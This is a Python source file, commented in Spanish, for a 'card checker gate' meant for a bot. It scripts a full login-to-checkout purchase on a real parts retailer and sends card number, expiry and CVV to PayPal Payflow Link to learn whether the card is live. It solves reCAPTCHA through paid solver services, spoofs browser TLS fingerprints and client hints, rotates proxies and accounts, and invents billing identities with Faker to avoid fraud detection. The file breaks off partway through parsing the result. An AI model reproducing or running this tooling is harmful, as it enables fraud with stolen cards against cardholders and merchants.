"""Gate Atlas Payflow - Verificación de tarjetas vía Eastern Surplus + PayPal Payflow Link.

TODO el flujo es HTTP puro (curl_cffi con impersonate=chrome131). El login se
hace sin navegador, con UA reforzado, rotación de client hints y fingerprint
human-like. El reCAPTCHA v2 se resuelve con solver externo (2Captcha/CapSolver)
usando la misma IP del flujo (proxy sticky).

Flujo medido (HAR www.easternsurplus.net2.har + compra real orden 22748, USD 5.30):

    1. GET /Login                      (extraer ViewState/EventValidation)
    2. POST /Login (btnLogin + g-recaptcha-response v2)
    3. GET /PartDetails/4648/9M-804-... (ficha del producto, ~$5)
    4. POST /PartDetails/4648/... (ddlCondition=28)
    5. POST /PartDetails/4648/... (btnAddToCart + ddlCondition=28)
    6. POST /Shop/ShoppingCart (btnCheckOut + txtProductQty=1)
    7. POST /Shop/Checkout (btnReviewOrder + datos de envío)
    8. POST /Shop/ReviewOrder (rblDeliveryMethod$1 = Pickup)
    9. POST /Shop/ReviewOrder (chkTermsOfUse = on)
    10. POST /Shop/ReviewOrder (btnCompleteOrder + g-recaptcha-response v2)
    11. GET /SecurePages/PayFlowProDialog.aspx?SecureToken=...&secureTokenId=...
    12. GET https://payflowlink.paypal.com/?SECURETOKEN=...&SECURETOKENID=...
    13. POST https://payflowlink.paypal.com/processCCInfo.do (tarjeta + CSRF + sid)
    14. Redirect automático de Payflow a /SecurePages/PayPalPayFlowReturn?RESULT=...

CLAVES DE OPERACIÓN:
- curl_cffi con impersonate='chrome131' (huella TLS del navegador).
- UA rotativo con client hints coherentes (Sec-Ch-Ua, Sec-Ch-Ua-Platform,
  Sec-Fetch-*, Accept-Language, etc.).
- reCAPTCHA v2 invisible (sitekey 6Lf03wwrAAAAAG4fCR5lNXKUf-aIkr-hPf7_d6C2)
  obligatorio en login y btnCompleteOrder. Resuelto con 2Captcha/CapSolver
  por la misma IP del flujo. Reintento con nuevo proxy y nuevo token si hay
  "score too low".
- ZIP fijo 19053, producto 9M-804 (condición 28, ~$5 USD).
- Script independiente, NO integrado al bot todavía.
"""
import asyncio
import html
import logging
import os
import random
import re
import time
import urllib.parse
from datetime import datetime
from pathlib import Path
from typing import Callable, Dict, List, Optional, Tuple

from curl_cffi import requests as curl_requests
from faker import Faker

from bot.config import gate_proxy

logger = logging.getLogger(__name__)

SITE = "https://www.easternsurplus.net"
LOGIN_URL = f"{SITE}/Login"
PRODUCT_URL = (
    f"{SITE}/PartDetails/4648/9M-804-Spare-Tire-Retainer-Threaded-Rod-Tee-Handle-M939A1-M939A2"
)
PRODUCT_CONDITION_VALUE = "28"
CART_URL = f"{SITE}/Shop/ShoppingCart.aspx"
CHECKOUT_URL = f"{SITE}/Shop/Checkout"
REVIEW_URL = f"{SITE}/Shop/ReviewOrder"
PAYFLOW_LINK_BASE = "https://payflowlink.paypal.com"

# --- reCAPTCHA v2 (obligatorio en login y btnCompleteOrder) ---
ATLAS_RECAPTCHA_SITEKEY = "6Lf03wwrAAAAAG4fCR5lNXKUf-aIkr-hPf7_d6C2"
ATLAS_2CAPTCHA_KEY = os.environ.get("ATLAS_2CAPTCHA_KEY", "") or os.environ.get(
    "TWO_CAPTCHA_API_KEY", ""
)
ATLAS_CAPSOLVER_KEY = os.environ.get("CAPSOLVER_API_KEY", "")
ATLAS_RECAPTCHA_TIMEOUT = int(os.environ.get("ATLAS_RECAPTCHA_TIMEOUT", "180"))

SCORE_LOW_MARKERS = (
    "recaptcha score is too low",
    "score is too low",
    "please reload the page and try again",
)

ATLAS_ACCOUNTS_FILE = Path("data/gates/atlas_accounts.txt")
ATLAS_BAD_ACCOUNTS_FILE = Path("data/atlas_bad_accounts.jsonl")
ATLAS_AUTO_REGISTER = True


# --------------------------------------------------------------------------
# User-Agents reales con client hints coherentes (fingerprint human-like)
# --------------------------------------------------------------------------
_UA_PROFILES: List[Dict[str, str]] = [
    {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="131", "Google Chrome";v="131", "Not-A.Brand";v="99"',
        "sec_ch_ua_mobile": "?0",
        "sec_ch_ua_platform": '"Windows"',
    },
    {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="130", "Google Chrome";v="130", "Not-A.Brand";v="99"',
        "sec_ch_ua_mobile": "?0",
        "sec_ch_ua_platform": '"Windows"',
    },
    {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="129", "Google Chrome";v="129", "Not-A.Brand";v="99"',
        "sec_ch_ua_mobile": "?0",
        "sec_ch_ua_platform": '"Windows"',
    },
]


def _random_ua_profile() -> Dict[str, str]:
    return random.choice(_UA_PROFILES)


# --------------------------------------------------------------------------
# Solver reCAPTCHA v2 (2Captcha / CapSolver) — misma IP del flujo
# --------------------------------------------------------------------------
def _proxy_for_solver(proxy_url: Optional[str]) -> Dict[str, str]:
    if not proxy_url:
        return {}
    p = urllib.parse.urlparse(proxy_url)
    if not p.hostname:
        return {}
    host = p.hostname + (f":{p.port}" if p.port else "")
    if p.username:
        host = f"{urllib.parse.unquote(p.username)}:{urllib.parse.unquote(p.password or '')}@{host}"
    return {"proxy": host, "proxytype": "HTTP"}


def solve_recaptcha_v2(
    page_url: str,
    proxy_url: Optional[str] = None,
    timeout: int = ATLAS_RECAPTCHA_TIMEOUT,
) -> Optional[str]:
    solver_order = []
    if ATLAS_2CAPTCHA_KEY:
        solver_order.append(("2captcha", ATLAS_2CAPTCHA_KEY))
    if ATLAS_CAPSOLVER_KEY:
        solver_order.append(("capsolver", ATLAS_CAPSOLVER_KEY))

    for name, key in solver_order:
        token = _solve_with(name, key, page_url, proxy_url, timeout)
        if token:
            return token
    logger.warning(
        "Atlas: ningún solver (%s) devolvió token v2",
        ", ".join(n for n, _ in solver_order) or "ninguno",
    )
    return None


def _solve_with(
    name: str,
    key: str,
    page_url: str,
    proxy_url: Optional[str],
    timeout: int,
) -> Optional[str]:
    try:
        if name == "2captcha":
            return _solve_2captcha(key, page_url, proxy_url, timeout)
        if name == "capsolver":
            return _solve_capsolver(key, page_url, proxy_url, timeout)
    except Exception as exc:
        logger.warning("Atlas: solver %s falló: %s", name, exc)
    return None


def _solve_2captcha(
    key: str, page_url: str, proxy_url: Optional[str], timeout: int
) -> Optional[str]:
    params = {
        "key": key,
        "method": "userrecaptcha",
        "googlekey": ATLAS_RECAPTCHA_SITEKEY,
        "pageurl": page_url,
        "json": 1,
    }
    params.update(_proxy_for_solver(proxy_url))
    try:
        r = curl_requests.get(
            "https://2captcha.com/in.php", params=params, timeout=30, impersonate="chrome131"
        )
        j = r.json()
    except Exception as exc:
        logger.warning("Atlas: 2captcha in.php falló: %s", exc)
        return None
    if str(j.get("status")) != "1":
        logger.warning("Atlas: 2captcha rechazó: %s", j.get("request"))
        return None
    rid = j["request"]
    t0 = time.time()
    while time.time() - t0 < timeout:
        time.sleep(5)
        try:
            rr = curl_requests.get(
                "https://2captcha.com/res.php",
                params={"key": key, "action": "get", "id": rid, "json": 1},
                timeout=30,
                impersonate="chrome131",
            )
            jj = rr.json()
        except Exception:
            continue
        if str(jj.get("status")) == "1":
            logger.info(
                "Atlas: token v2 (2captcha) obtenido (%d chars)", len(jj["request"])
            )
            return jj["request"]
        if jj.get("request") not in ("CAPCHA_NOT_READY", "CAPTCHA_NOT_READY"):
            logger.warning("Atlas: 2captcha devolvió %s", jj.get("request"))
            return None
    logger.warning("Atlas: timeout esperando token 2captcha")
    return None


def _solve_capsolver(
    key: str, page_url: str, proxy_url: Optional[str], timeout: int
) -> Optional[str]:
    payload = {
        "clientKey": key,
        "task": {
            "type": "ReCaptchaV2TaskProxyless",
            "websiteURL": page_url,
            "websiteKey": ATLAS_RECAPTCHA_SITEKEY,
        },
    }
    if proxy_url:
        p = urllib.parse.urlparse(proxy_url)
        if p.hostname:
            payload["task"]["type"] = "ReCaptchaV2Task"
            proxy_user = urllib.parse.unquote(p.username or "")
            proxy_pass = urllib.parse.unquote(p.password or "")
            payload["task"]["proxyType"] = "http"
            payload["task"]["proxyAddress"] = p.hostname
            payload["task"]["proxyPort"] = p.port or 80
            if proxy_user:
                payload["task"]["proxyLogin"] = proxy_user
                payload["task"]["proxyPassword"] = proxy_pass
    try:
        r = curl_requests.post(
            "https://api.capsolver.com/createTask",
            json=payload,
            timeout=30,
            impersonate="chrome131",
        )
        j = r.json()
    except Exception as exc:
        logger.warning("Atlas: capsolver createTask falló: %s", exc)
        return None
    if j.get("errorId") != 0:
        logger.warning("Atlas: capsolver rechazó: %s", j.get("errorDescription"))
        return None
    rid = j["taskId"]
    t0 = time.time()
    while time.time() - t0 < timeout:
        time.sleep(5)
        try:
            rr = curl_requests.post(
                "https://api.capsolver.com/getTaskResult",
                json={"clientKey": key, "taskId": rid},
                timeout=30,
                impersonate="chrome131",
            )
            jj = rr.json()
        except Exception:
            continue
        if jj.get("status") == "ready":
            token = jj.get("solution", {}).get("gRecaptchaResponse")
            if token:
                logger.info(
                    "Atlas: token v2 (capsolver) obtenido (%d chars)", len(token)
                )
                return token
            return None
        if jj.get("status") not in ("processing", "ready"):
            logger.warning("Atlas: capsolver devolvió %s", jj.get("errorDescription"))
            return None
    logger.warning("Atlas: timeout esperando token capsolver")
    return None


def _is_score_low(body: str) -> bool:
    low = (body or "").lower()
    return any(m in low for m in SCORE_LOW_MARKERS)


# --------------------------------------------------------------------------
# Pool de cuentas
# --------------------------------------------------------------------------
def _load_atlas_accounts() -> List[Tuple[str, str]]:
    accounts: List[Tuple[str, str]] = []
    try:
        with open(ATLAS_ACCOUNTS_FILE, encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#") or "|" not in line:
                    continue
                email, pwd = line.split("|", 1)
                email, pwd = email.strip(), pwd.strip()
                if email and pwd:
                    accounts.append((email, pwd))
    except FileNotFoundError:
        pass
    return accounts


def _mark_atlas_bad(email: str, reason: str) -> None:
    try:
        import json as _json

        ATLAS_BAD_ACCOUNTS_FILE.parent.mkdir(parents=True, exist_ok=True)
        with open(ATLAS_BAD_ACCOUNTS_FILE, "a", encoding="utf-8") as fh:
            fh.write(
                _json.dumps(
                    {"ts": time.time(), "email": email, "reason": reason}
                )
                + "\n"
            )
        logger.warning("Cuenta Atlas marcada como mala: %s (%s)", email, reason)
    except Exception as exc:
        logger.debug("No se pudo marcar cuenta mala: %s", exc)


def _add_atlas_account(email: str, pwd: str) -> None:
    try:
        ATLAS_ACCOUNTS_FILE.parent.mkdir(parents=True, exist_ok=True)
        with open(ATLAS_ACCOUNTS_FILE, "a", encoding="utf-8") as fh:
            fh.write(f"\n{email}|{pwd}\n")
        logger.info("Cuenta Atlas generada y agregada: %s", email)
    except Exception as exc:
        logger.warning("No se pudo agregar cuenta Atlas: %s", exc)


def extract_viewstate(html_text: str) -> dict:
    """Extraer ViewState, EventValidation y generador del HTML (ASP.NET)."""
    viewstate_match = re.search(r'id="__VIEWSTATE"[^>]*value="([^"]*)"', html_text or "")
    eventvalidation_match = re.search(
        r'id="__EVENTVALIDATION"[^>]*value="([^"]*)"', html_text or ""
    )
    viewstategenerator_match = re.search(
        r'id="__VIEWSTATEGENERATOR"[^>]*value="([^"]*)"', html_text or ""
    )
    return {
        "__VIEWSTATE": viewstate_match.group(1) if viewstate_match else "",
        "__EVENTVALIDATION": (
            eventvalidation_match.group(1) if eventvalidation_match else ""
        ),
        "__VIEWSTATEGENERATOR": (
            viewstategenerator_match.group(1) if viewstategenerator_match else ""
        ),
    }


def _form_fields(html_text: str) -> dict:
    from bs4 import BeautifulSoup

    soup = BeautifulSoup(html_text or "", "html.parser")
    data: dict = {}
    for inp in soup.find_all("input"):
        name = inp.get("name")
        if not name:
            continue
        if (inp.get("type") or "").lower() in ("submit", "button"):
            continue
        data[name] = inp.get("value", "")
    for sel in soup.find_all("select"):
        name = sel.get("name")
        if not name:
            continue
        opts = sel.find_all("option")
        chosen = [o for o in opts if o.get("selected")]
        data[name] = (
            chosen[0].get("value", "") if chosen else (opts[0].get("value", "") if opts else "")
        )
    return data


# --------------------------------------------------------------------------
# Proxy
# --------------------------------------------------------------------------
def _pick_proxy() -> Tuple[Optional[dict], Optional[str]]:
    for pool in ("mx", "rot"):
        proxy_url = gate_proxy(pool)
        if proxy_url:
            return {"http": proxy_url, "https": proxy_url}, proxy_url
    return None, None


def _human_wait(a: float = 2.0, b: float = 5.0) -> None:
    time.sleep(random.uniform(a, b))


async def _async_human_wait(a: float = 2.0, b: float = 5.0) -> None:
    await asyncio.sleep(random.uniform(a, b))


# --------------------------------------------------------------------------
# Validación de tarjeta
# --------------------------------------------------------------------------
def procesar_y_validar(card: str) -> Optional[Tuple[str, str, str, str, str]]:
    KEYS = "/#%&()=?¿!¡*[]{}-_.:,;|@+"
    for KEY in KEYS:
        card = card.replace(KEY, "|")
    card = card.replace(" ", "|")

    match = re.search(r"\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}", card)
    if not match:
        return None
    values = card.split("|")
    if len(values) < 4:
        return None
    cc_number = values[0]
    mes = values[1]
    ano_raw = values[2]
    ano_largo = ano_raw if len(ano_raw) == 4 else f"20{ano_raw}"
    ano_corto = ano_largo[2:]
    cvv = values[3][0:4]

    try:
        ano_int = int(ano_largo)
        mes_int = int(mes)
        ahora = datetime.now()
        if ano_int < ahora.year or (ano_int == ahora.year and mes_int < ahora.month):
            return None
    except ValueError:
        return None

    return cc_number, mes, ano_corto, ano_largo, cvv


def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return None


def _err(tiempo: str) -> Dict[str, str]:
    return {"status": "⚠️ Error", "message": "Error, avisar a un admin.", "time": tiempo}


# --------------------------------------------------------------------------
# Gate principal — todo HTTP con curl_cffi (impersonate chrome131)
# --------------------------------------------------------------------------
async def atlas_check(card_data: str, user_id: Optional[int] = None) -> Dict[str, str]:
    logger.info(f"Atlas gate: inicio check user_id={user_id}")
    inicio = datetime.now()

    def _t():
        return f"{float((datetime.now() - inicio).total_seconds()):0.2f}"

    try:
        resultado = procesar_y_validar(card_data)
        if resultado is None:
            return {
                "status": "⚠️ Error",
                "message": "Formato de tarjeta inválido. Usa: cc|mes|año|cvv",
                "time": "0.00",
            }
        cc_number, mes, ano_corto, ano_largo, cvv = resultado

        faker = Faker()
        nombre = faker.first_name() or "Fernando"
        apellido = faker.last_name() or "Estrada"
        phone = "8120098723"
        street = faker.street_address() or "Waterbury Court"
        city = faker.city() or "San Jose"
        state_abbr = faker.state_abbr() or "CA"
        zip_code = "19053"  # ZIP fijo para pickup

        # Proxy obligatorio
        _, proxy_url = _pick_proxy()
        if not proxy_url:
            return _err(_t())

        proxies = {"http": proxy_url, "https": proxy_url}
        profile = _random_ua_profile()

        # Headers base de navegador real (coherentes con impersonate chrome131)
        def base_headers() -> dict:
            return {
                "User-Agent": profile["ua"],
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Cache-Control": "max-age=0",
                "Sec-Ch-Ua": profile["sec_ch_ua"],
                "Sec-Ch-Ua-Mobile": profile["sec_ch_ua_mobile"],
                "Sec-Ch-Ua-Platform": profile["sec_ch_ua_platform"],
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Upgrade-Insecure-Requests": "1",
            }

        def post_headers(referer: str, origin: str = SITE) -> dict:
            return {
                **base_headers(),
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Cache-Control": "no-cache",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": origin,
                "Referer": referer,
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "X-MicrosoftAjax": "Delta=true",
                "X-Requested-With": "XMLHttpRequest",
            }

        _PANEL = (
            "ctl00$ctl00$globalContent$mainContent$"
            "ctl00$ctl00$globalContent$mainContent$rdAjaxPanelPanel"
        )
        _RAD = "ctl00_ctl00_globalContent_mainContent_rdAjaxPanel"

        def _async_payload(data, target):
            data["__EVENTTARGET"] = target
            data["__EVENTARGUMENT"] = ""
            data["ctl00$ctl00$ScriptMan"] = f"{_PANEL}|{target}"
            data["RadAJAXControlID"] = _RAD
            data["__ASYNCPOST"] = "true"
            return data

        # ================================================================
        # Sesión curl_cffi con impersonate (huella TLS del navegador)
        # ================================================================
        sess = curl_requests.Session(impersonate="chrome131")
        sess.proxies = proxies

        # ================================================================
        # PASO 1: Login (btnLogin + g-recaptcha-response v2)
        # ================================================================
        accounts = _load_atlas_accounts()
        if not accounts:
            return _err(_t())

        login_ok = False
        for _attempt, (_email, _pwd) in enumerate(accounts):
            if _attempt > 0:
                _, proxy_url = _pick_proxy()
                if not proxy_url:
                    continue
                proxies = {"http": proxy_url, "https": proxy_url}
                sess.proxies = proxies
                profile = _random_ua_profile()

            await _async_human_wait(3, 6)

            try:
                r0 = sess.get(LOGIN_URL, headers=base_headers(), timeout=30)
            except Exception:
                _, proxy_url = _pick_proxy()
                if not proxy_url:
                    continue
                proxies = {"http": proxy_url, "https": proxy_url}
                sess.proxies = proxies
                r0 = sess.get(LOGIN_URL, headers=base_headers(), timeout=30)

            await _async_human_wait(2, 4)

            vs = extract_viewstate(r0.text)

            # --- Intento 1: login SIN captcha (la mayoría de logins no lo exigen) ---
            data = _form_fields(r0.text)
            data.update(vs)
            data = _async_payload(
                data, "ctl00$ctl00$globalContent$mainContent$btnLogin"
            )
            data["ctl00$ctl00$globalContent$mainContent$txtEmailAddress"] = _email
            data["ctl00$ctl00$globalContent$mainContent$txtPassword"] = _pwd

            r_login = sess.post(
                LOGIN_URL,
                data=urllib.parse.urlencode(data),
                headers=post_headers(LOGIN_URL, SITE),
                timeout=30,
            )
            await _async_human_wait(3, 6)

            cookie_names = [c.name for c in sess.cookies.jar]
            if any(c == ".EasternSurplus" for c in cookie_names):
                login_ok = True
                break

            # --- Intento 2: login CON captcha (si el sitio lo exige) ---
            _mark_atlas_bad(_email, "login sin captcha falló")
            recaptcha_token = solve_recaptcha_v2(LOGIN_URL, proxy_url, timeout=120)
            if not recaptcha_token:
                logger.warning(
                    "Atlas: sin token captcha para login de %s, probando siguiente cuenta", _email
                )
                try:
                    sess.cookies.clear()
                except Exception:
                    pass
                continue

            data2 = _form_fields(r0.text)
            data2.update(vs)
            data2 = _async_payload(
                data2, "ctl00$ctl00$globalContent$mainContent$btnLogin"
            )
            data2["ctl00$ctl00$globalContent$mainContent$txtEmailAddress"] = _email
            data2["ctl00$ctl00$globalContent$mainContent$txtPassword"] = _pwd
            data2["g-recaptcha-response"] = recaptcha_token

            r_login2 = sess.post(
                LOGIN_URL,
                data=urllib.parse.urlencode(data2),
                headers=post_headers(LOGIN_URL, SITE),
                timeout=30,
            )
            await _async_human_wait(3, 6)

            cookie_names = [c.name for c in sess.cookies.jar]
            if any(c == ".EasternSurplus" for c in cookie_names):
                login_ok = True
                break
            _mark_atlas_bad(_email, "login con captcha falló")
            try:
                sess.cookies.clear()
            except Exception:
                pass

        if not login_ok:
            return _err(_t())

        # ================================================================
        # PASO 2: carrito limpio
        # ================================================================
        await _async_human_wait(2, 4)
        r0c = sess.get(CART_URL, headers=base_headers(), timeout=30)
        try:
            _rm = re.search(r'name="(ctl00\$[^"]*btnRemove)"', r0c.text)
            while _rm and "no results to display" not in r0c.text.lower():
                _d = _form_fields(r0c.text)
                sess.post(
                    CART_URL,
                    data=urllib.parse.urlencode(_d),
                    headers={**post_headers(CART_URL, SITE)},
                    timeout=30,
                )
                await _async_human_wait(2, 4)
                r0c = sess.get(CART_URL, headers=base_headers(), timeout=30)
                _rm = re.search(r'name="(ctl00\$[^"]*btnRemove)"', r0c.text)
        except Exception:
            pass

        # ================================================================
        # PASO 3: ficha del producto + condición + Add To Cart
        # ================================================================
        await _async_human_wait(2, 4)
        r1 = sess.get(PRODUCT_URL, headers=base_headers(), timeout=40)
        data = _form_fields(r1.text)

        cond_key = next((k for k in data if k.lower().endswith("ddlcondition")), None)
        if cond_key:
            data[cond_key] = PRODUCT_CONDITION_VALUE
        sess.post(
            PRODUCT_URL,
            data=urllib.parse.urlencode(
                _async_payload(data, "ctl00$ctl00$globalContent$mainContent$ddlCondition")
            ),
            headers={**post_headers(PRODUCT_URL, SITE)},
            timeout=30,
        )
        await _async_human_wait(3, 5)

        r1b = sess.get(PRODUCT_URL, headers=base_headers(), timeout=40)
        data = _form_fields(r1b.text)
        if cond_key:
            data[cond_key] = PRODUCT_CONDITION_VALUE
        m_btn = re.search(r'name="(ctl00\$[^"]*btnAddToCart)"', r1b.text)
        if not m_btn:
            return _err(_t())
        sess.post(
            PRODUCT_URL,
            data=urllib.parse.urlencode(_async_payload(data, m_btn.group(1))),
            headers={**post_headers(PRODUCT_URL, SITE)},
            timeout=30,
        )
        await _async_human_wait(3, 5)

        # ================================================================
        # PASO 4: carrito -> btnCheckOut (con qty=1)
        # ================================================================
        r3 = sess.get(CART_URL, headers=base_headers(), timeout=30)
        if "no results to display" in r3.text.lower():
            return _err(_t())
        data = _form_fields(r3.text)
        qty_key = next((k for k in data if "txtProductQty" in k), None)
        if qty_key:
            data[qty_key] = "1"
        for k in list(data):
            low = k.lower()
            if low.endswith("ddlcountry"):
                data[k] = "UNITED STATES"
            elif low.endswith("txtzipcode") and not data[k]:
                data[k] = zip_code
        sess.post(
            CART_URL,
            data=urllib.parse.urlencode(
                _async_payload(data, "ctl00$ctl00$globalContent$mainContent$btnCheckOut")
            ),
            headers={**post_headers(CART_URL, SITE)},
            timeout=30,
        )
        await _async_human_wait(3, 5)

        # ================================================================
        # PASO 5: checkout -> review
        # ================================================================
        r5 = sess.get(CHECKOUT_URL, headers=base_headers(), timeout=30)
        data = dict(_form_fields(r5.text))
        data.update(
            {
                "__EVENTTARGET": "ctl00$ctl00$globalContent$mainContent$btnReviewOrder",
                "__EVENTARGUMENT": "",
                "ctl00$ctl00$ScriptMan": f"{_PANEL}|ctl00$ctl00$globalContent$mainContent$btnReviewOrder",
                "RadAJAXControlID": _RAD,
                "__ASYNCPOST": "true",
                "ctl00$ctl00$globalContent$mainContent$ddlShippingCountry": "230",
                "ctl00$ctl00$globalContent$mainContent$ddlShippingState": "10",
                "ctl00$ctl00$globalContent$mainContent$txtPhone": phone,
                "ctl00$ctl00$globalContent$mainContent$txtShippingAdd1": street,
                "ctl00$ctl00$globalContent$mainContent$txtShippingAdd2": "",
                "ctl00$ctl00$globalContent$mainContent$txtShippingCity": city,
                "ctl00$ctl00$globalContent$mainContent$txtShippingName": f"{nombre} {apellido}",
                "ctl00$ctl00$globalContent$mainContent$txtShippingZip": zip_code,
            }
        )
        sess.post(
            CHECKOUT_URL,
            data=urllib.parse.urlencode(data),
            headers={**post_headers(CHECKOUT_URL, SITE)},
            timeout=30,
        )
        await _async_human_wait(3, 5)

        # ================================================================
        # PASO 6: review -> delivery method (Pickup)
        # ================================================================
        r7 = sess.get(REVIEW_URL, headers=base_headers(), timeout=30)
        data = _form_fields(r7.text)
        data.update(
            {
                "ctl00$ctl00$globalContent$mainContent$rblDeliveryMethod": "2",
                "ctl00$ctl00$globalContent$mainContent$ddlShippingOptions": "0",
            }
        )
        sess.post(
            REVIEW_URL,
            data=urllib.parse.urlencode(
                _async_payload(
                    data,
                    "ctl00$ctl00$globalContent$mainContent$rblDeliveryMethod$1",
                )
            ),
            headers={**post_headers(REVIEW_URL, SITE)},
            timeout=30,
        )
        await _async_human_wait(3, 5)

        # ================================================================
        # PASO 7: review -> terms of use
        # ================================================================
        r7b = sess.get(REVIEW_URL, headers=base_headers(), timeout=30)
        data = _form_fields(r7b.text)
        data.update(
            {
                "ctl00$ctl00$globalContent$mainContent$chkTermsOfUse": "on",
                "ctl00$ctl00$globalContent$mainContent$rblDeliveryMethod": "2",
            }
        )
        data.pop("ctl00$ctl00$globalContent$mainContent$ddlShippingOptions", None)
        sess.post(
            REVIEW_URL,
            data=urllib.parse.urlencode(
                _async_payload(
                    data, "ctl00$ctl00$globalContent$mainContent$chkTermsOfUse"
                )
            ),
            headers={**post_headers(REVIEW_URL, SITE)},
            timeout=30,
        )
        base_html = sess.get(REVIEW_URL, headers=base_headers(), timeout=30)
        base_html_text = base_html.text if isinstance(base_html.text, str) else ""
        await _async_human_wait(3, 5)

        # ================================================================
        # PASO 8: btnCompleteOrder CON TOKEN v2 (con reintentos y cambio de proxy)
        # ================================================================
        r8 = None
        dialog_url = ""
        m = None
        m2 = None
        for intento in range(5):
            # Recargar ReviewOrder para obtener ViewState fresco en cada intento
            base_html = sess.get(REVIEW_URL, headers=base_headers(), timeout=30)
            base_html_text = base_html.text if isinstance(base_html.text, str) else ""

            # Resolver captcha justo antes de enviar (el token expira rápido)
            recaptcha_token = solve_recaptcha_v2(REVIEW_URL, proxy_url, timeout=120)
            if not recaptcha_token:
                logger.warning("Atlas: sin token captcha en intento %d", intento + 1)
                await _async_human_wait(5, 8)
                continue

            data = _form_fields(base_html_text)
            data.update(
                {
                    "ctl00$ctl00$globalContent$mainContent$chkTermsOfUse": "on",
                    "ctl00$ctl00$globalContent$mainContent$rblDeliveryMethod": "2",
                    "g-recaptcha-response": recaptcha_token,
                }
            )
            data.pop("ctl00$ctl00$globalContent$mainContent$ddlShippingOptions", None)
            r8 = sess.post(
                REVIEW_URL,
                data=urllib.parse.urlencode(
                    _async_payload(
                        data,
                        "ctl00$ctl00$globalContent$mainContent$btnCompleteOrder",
                    )
                ),
                headers={**post_headers(REVIEW_URL, SITE)},
                timeout=30,
            )
            dialog_url = r8.headers.get("location", "") or ""
            m = re.search(r"SecureToken=([^&\"']+)", r8.text or "")
            m2 = re.search(r"[Ss]ecure[Tt]oken[Ii]d=([^&\"']+)", r8.text or "", re.I)
            if (dialog_url and "PayFlowProDialog" in dialog_url) or m:
                logger.info("Atlas: SecureToken obtenido en intento %d", intento + 1)
                break

            body = r8.text or ""
            if not _is_score_low(body):
                logger.warning(
                    "Atlas: btnCompleteOrder sin SecureToken y sin banner de score"
                )
                break
            logger.info("Atlas: score bajo en intento %d, reintentando", intento + 1)
            await _async_human_wait(5, 8)

        if (not dialog_url or "PayFlowProDialog" not in dialog_url) and not m:
            return _err(_t())
        if dialog_url.startswith("/"):
            dialog_url = SITE + dialog_url

        # ================================================================
        # PASO 9: PayFlowProDialog -> Payflow Link
        # ================================================================
        await _async_human_wait(2, 4)
        r9 = sess.get(dialog_url, headers=base_headers(), timeout=30)
        sec_match = re.search(r"[Ss]ecure[Tt]oken=([^&\"']+)", r9.text)
        sid_match = re.search(r"[Ss]ecure[Tt]oken[Ii]d=([^&\"']+)", r9.text)
        securetoken = sec_match.group(1) if sec_match else (m.group(1) if m else "")
        securetokenid = sid_match.group(1) if sid_match else (m2.group(1) if m2 else "")
        if not securetoken or not securetokenid:
            return _err(_t())

        headers = {
            **base_headers(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": SITE + "/",
            "Upgrade-Insecure-Requests": "1",
        }
        r10 = sess.get(
            PAYFLOW_LINK_BASE,
            params={"SecureTokenID": securetokenid, "SecureToken": securetoken},
            headers=headers,
            timeout=30,
        )
        csrf_match = re.search(r'name="CSRF_TOKEN"[^>]*value="([^"]+)"', r10.text)
        sid_match2 = re.search(r'name="sid"[^>]*value="([^"]+)"', r10.text)
        sid_url_match = re.search(r"[?&]sid=([^&\"']+)", r10.url or "")
        csrf = csrf_match.group(1) if csrf_match else ""
        sid = sid_match2.group(1) if sid_match2 else (sid_url_match.group(1) if sid_url_match else "")
        if not csrf:
            return _err(_t())

        # ================================================================
        # PASO 10: Procesar tarjeta en Payflow (processCCInfo.do)
        # ================================================================
        await _async_human_wait(2, 4)
        expdate = f"{mes}/{ano_largo}"
        headers_pf = {
            **base_headers(),
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "max-age=0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://payflowlink.paypal.com",
            "Referer": f"https://payflowlink.paypal.com/?SecureTokenID={securetokenid}&SecureToken={securetoken}",
            "Upgrade-Insecure-Requests": "1",
        }
        data_pf = [
            ("subaction", ""),
            ("currentpage", "mobileCCEntryPage"),
            ("sameasbilling", "false"),
            ("sid", sid),
            ("src_identifier", "PFL_mobilePayments"),
            ("CARDNUM", cc_number),
            ("EXPDATE", expdate),
            ("CSC", cvv),
            ("billingAddress1", street),
            ("billingAddress2", ""),
            ("ZIP", zip_code),
            ("CSRF_TOKEN", csrf),
            ("pay.x", "Pay Now"),
        ]
        r11 = sess.post(
            "https://payflowlink.paypal.com/processCCInfo.do",
            headers=headers_pf,
            data=data_pf,
            timeout=40,
        )

        tiempo = _t()
        source = r11.text or ""
        _debug_save_receipt("s11_receipt", r11.status_code, source)

        result = parseX(source, 'name="RESULT" value="', '"') or ""
        respmsg = parseX(source, 'name="RESPMSG" value="', '"/>')
        pnref = parseX(source, 'name="PNREF" value="', '"') or ""
        avsdata = parseX(source, 'name="AVSDATA" value="', '"/>')
        detail = f"RESULT={result} {respmsg or ''} | PNREF={pnref} | AVS: {avsdata or ''}".strip()

        confirmed = False
        back_body = ""
        try:
